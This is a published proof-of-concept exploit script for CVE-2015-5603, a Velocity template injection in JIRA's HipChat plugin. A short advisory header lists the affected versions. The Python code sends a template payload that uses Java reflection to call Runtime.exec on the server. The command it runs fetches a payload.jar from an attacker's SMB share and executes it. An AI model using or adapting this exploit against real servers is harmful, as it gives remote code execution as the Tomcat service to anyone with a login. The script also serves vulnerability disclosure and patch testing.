# JIRA and HipChat for JIRA plugin Velocity Template Injection Vulnerability
# Date: 2015-08-26
# CVE ID: CVE-2015-5603
# Vendor Link: https://confluence.atlassian.com/jira/jira-and-hipchat-for-jira-plugin-security-advisory-2015-08-26-776650785.html
#
# Product: JIRA and the HipChat for JIRA plugin.
# Affected HipChat For JIRA plugin versions: 1.3.2 <= version < 6.30.0
# Affected JIRA product versions: 6.3.5 <= version <  6.4.11
#
# Discovered internally by Atlassian (vendor)
# Proof of concept script by Chris Wood <chris@invivid.com>
#
# Tested against JIRA 6.3.4a with HipChat 6.29.2 on Windows 7 x64
# Allows any authenticated JIRA user to execute code running as Tomcat identity
############################################################################
 
import urllib2
import json
 
# cookie of any authenticated session (ex. jira-user)
JSESSIONID = &#039;541631B0D72EF1C71E932953F4760A70&#039;
 
# jira server
RHOST      = &#039;http://192.168.2.15:8080&#039;
 
# samba public share, read/write to anonymous users
CMD        = &#039; java -jar \\\\192.168.2.234\\public\\payload.jar &#039;
data = {
    &#039;message&#039;: &#039; $i18n.getClass().forName(\&#039;java.lang.Runtime\&#039;).getMethod(\&#039;getRuntime\&#039;, null).invoke(null, null).exec(\&#039;&#039; + CMD + &#039;\&#039;).waitFor() &#039;
}
 
opener = urllib2.build_opener()
opener.addheaders.append((&#039;Cookie&#039;, &#039;JSESSIONID=&#039; + JSESSIONID))
urllib2.install_opener(opener)
req = urllib2.Request(RHOST + &#039;/rest/hipchat/integrations/1.0/message/render/&#039;)
req.add_header(&#039;Content-Type&#039;, &#039;application/json&#039;)
 
response = urllib2.urlopen(req, json.dumps(data))
 
print(&#039;##################################&#039;)
print(&#039;######### CVE-2015-5603 ##########&#039;)
print(&#039;##################################&#039;)
print(response.read())

